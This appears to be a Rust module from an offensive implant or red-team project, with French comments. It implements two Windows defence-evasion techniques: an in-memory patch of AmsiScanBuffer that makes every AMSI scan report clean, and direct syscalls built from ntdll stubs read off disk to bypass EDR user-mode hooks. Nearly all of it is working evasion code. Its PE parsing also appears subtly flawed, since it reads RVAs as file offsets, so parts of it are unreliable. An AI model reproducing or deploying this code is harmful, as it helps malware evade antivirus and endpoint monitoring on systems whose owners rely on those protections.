// Deux techniques de contournement AV/EDR :
// 1. Bypass AMSI : patch mémoire sur AmsiScanBuffer → retourne toujours AMSI_RESULT_CLEAN
// 2. Syscall direct : lit le numéro de syscall dans ntdll.dll non hooké et invoque
//    l'instruction syscall directement, contournant les hooks en espace utilisateur.
//
// Ces techniques correspondent aux exigences du sujet :
//   – bypass AMSI (T1562.001)
//   – direct ntdll syscall stubs (T1106)

pub fn run(args: &str) -> String {
    match args.trim() {
        "amsi"   | "" => bypass_amsi(),
        "ntqsi"       => demo_direct_syscall(),
        _             => "syscall <amsi|ntqsi>".to_string(),
    }
}

// ── Bypass AMSI ───────────────────────────────────────────────────────────────

fn bypass_amsi() -> String {
    #[cfg(not(windows))]
    return "syscall disponible sur Windows uniquement".to_string();

    #[cfg(windows)]
    unsafe {
        match patch_amsi_scan_buffer() {
            Ok(msg) => msg,
            Err(e)  => format!("[err] AMSI bypass: {}", e),
        }
    }
}

#[cfg(windows)]
unsafe fn patch_amsi_scan_buffer() -> Result<String, String> {
    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleW, GetProcAddress};
    use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE};

    let mod_name: Vec<u16> = "amsi.dll\0".encode_utf16().collect();
    let mut hmod = GetModuleHandleW(mod_name.as_ptr());
    if hmod == 0 {
        // amsi.dll pas encore chargé → le charger
        let hmod2 = windows_sys::Win32::System::LibraryLoader::LoadLibraryW(mod_name.as_ptr());
        if hmod2 == 0 {
            return Err("amsi.dll introuvable".to_string());
        }
        hmod = hmod2;
    }

    let fn_name = b"AmsiScanBuffer\0";
    let fn_addr = GetProcAddress(hmod, fn_name.as_ptr());
    let fn_addr = match fn_addr {
        Some(f) => f as *mut u8,
        None => return Err("AmsiScanBuffer introuvable".to_string()),
    };

    // Patch : xor eax,eax (31 C0) ; ret (C3) → retourne 0 = AMSI_RESULT_CLEAN
    let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
    let mut old_protect = 0u32;
    if VirtualProtect(fn_addr as _, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
        return Err("VirtualProtect".to_string());
    }
    std::ptr::copy_nonoverlapping(patch.as_ptr(), fn_addr, patch.len());
    VirtualProtect(fn_addr as _, patch.len(), old_protect, &mut old_protect);

    Ok("[ok] AmsiScanBuffer patché → AMSI_RESULT_CLEAN (T1562.001)".to_string())
}

// ── Syscall direct ─────────────────────────────────────────────────────────────

fn demo_direct_syscall() -> String {
    #[cfg(not(windows))]
    return "syscall disponible sur Windows uniquement".to_string();

    #[cfg(windows)]
    unsafe {
        match direct_ntqsi() {
            Ok(msg) => msg,
            Err(e)  => format!("[err] syscall direct: {}", e),
        }
    }
}

// Lit le numéro de syscall NtQuerySystemInformation dans ntdll.dll (non hooké sur disque),
// puis l'invoque directement via l'instruction syscall (T1106).
#[cfg(windows)]
unsafe fn direct_ntqsi() -> Result<String, String> {
    let ssn = get_syscall_number("NtQuerySystemInformation")?;

    // SystemBasicInformation (class=0) → 44 octets sur x64
    let mut info = [0u8; 64];
    let mut retlen = 0u32;
    let status: i32;

    std::arch::asm!(
        "mov r10, rcx",
        "syscall",
        in("eax") ssn,
        in("rcx") 0u32,          // SystemBasicInformation
        in("rdx") info.as_mut_ptr(),
        in("r8")  info.len() as u32,
        in("r9")  &mut retlen as *mut u32,
        lateout("eax") status,
        options(nostack),
    );

    if status == 0 {
        Ok(format!(
            "[ok] NtQuerySystemInformation syscall direct (SSN=0x{:02X}, NTSTATUS=0) → {} octets (T1106)",
            ssn, retlen
        ))
    } else {
        Err(format!("NTSTATUS 0x{:08X}", status as u32))
    }
}

// Lit le stub ntdll depuis le disque (non hooké) et extrait le numéro de syscall
// (octet 4-5 du stub mov eax, N : B8 NN NN 00 00).
#[cfg(windows)]
fn get_syscall_number(fn_name: &str) -> Result<u32, String> {
    let ntdll_path = {
        let mut sys32 = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
        sys32.push_str("\\System32\\ntdll.dll");
        sys32
    };

    let data = std::fs::read(&ntdll_path)
        .map_err(|e| format!("ntdll.dll: {}", e))?;

    // Parse PE headers pour trouver l'export par nom
    let base = data.as_ptr() as usize;
    let dos = unsafe { &*(base as *const DosHeader) };
    if dos.e_magic != 0x5A4D { return Err("DOS magic invalide".to_string()); }

    let nt = unsafe { &*((base + dos.e_lfanew as usize) as *const NtHeaders64) };
    if nt.signature != 0x00004550 { return Err("PE signature invalide".to_string()); }

    let export_rva = nt.optional.data_dirs[0].virtual_address as usize;
    if export_rva == 0 { return Err("pas de répertoire d'exports".to_string()); }

    let exp = unsafe { &*((base + export_rva) as *const ExportDir) };
    let n = exp.number_of_names as usize;
    let names_rva   = exp.address_of_names as usize;
    let ordinals_rva = exp.address_of_name_ordinals as usize;
    let funcs_rva   = exp.address_of_functions as usize;

    for i in 0..n {
        let name_rva = unsafe { *((base + names_rva + i * 4) as *const u32) } as usize;
        let name_ptr = (base + name_rva) as *const u8;
        let name = unsafe {
            let mut len = 0;
            while *name_ptr.add(len) != 0 { len += 1; }
            std::str::from_utf8(std::slice::from_raw_parts(name_ptr, len)).unwrap_or("")
        };
        if name == fn_name {
            let ord = unsafe { *((base + ordinals_rva + i * 2) as *const u16) } as usize;
            let fn_rva = unsafe { *((base + funcs_rva + ord * 4) as *const u32) } as usize;
            let stub = (base + fn_rva) as *const u8;
            // Stub x64 normal : 4C 8B D1 (mov r10,rcx) B8 NN NN 00 00 (mov eax,N)
            let b = unsafe { std::slice::from_raw_parts(stub, 8) };
            if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8 {
                let ssn = u32::from_le_bytes([b[4], b[5], b[6], b[7]]);
                return Ok(ssn);
            }
            return Err(format!("{} hooké (premier octet 0x{:02X})", fn_name, b[0]));
        }
    }
    Err(format!("{} non trouvé dans ntdll", fn_name))
}

#[cfg(windows)]
#[repr(C)]
struct DosHeader { e_magic: u16, _pad: [u8; 58], e_lfanew: u32 }

#[cfg(windows)]
#[repr(C)]
struct DataDir { virtual_address: u32, _size: u32 }

#[cfg(windows)]
#[repr(C)]
struct OptionalHeader64 {
    _magic: u16, _maj: u8, _min: u8, _scs: u32, _ics: u32, _ics2: u32,
    _ep: u32, _ba: u32, _ib: u64, _sa: u32, _fs: u32, _sub: u16,
    _dll: u16, _ssz: u32, _csz: u32, _hdr: u32, _cc: u32, _mt: u16,
    _ss: u16, _lv: u32, _lv2: u32, _ov: u32, _ov2: u32, _ci: u32,
    _sih: u64, _ss2: u64, _lbs: u32, _nfa: u32,
    data_dirs: [DataDir; 16],
}

#[cfg(windows)]
#[repr(C)]
struct FileHeader { _mach: u16, _ns: u16, _ts: u32, _spt: u32, _nos: u32, _soh: u16, _cc: u16 }

#[cfg(windows)]
#[repr(C)]
struct NtHeaders64 { signature: u32, file: FileHeader, optional: OptionalHeader64 }

#[cfg(windows)]
#[repr(C)]
struct ExportDir {
    _flags: u32, _ts: u32, _maj: u16, _min: u16, _name: u32,
    _base: u32, number_of_functions: u32, number_of_names: u32,
    address_of_functions: u32, address_of_names: u32, address_of_name_ordinals: u32,
}
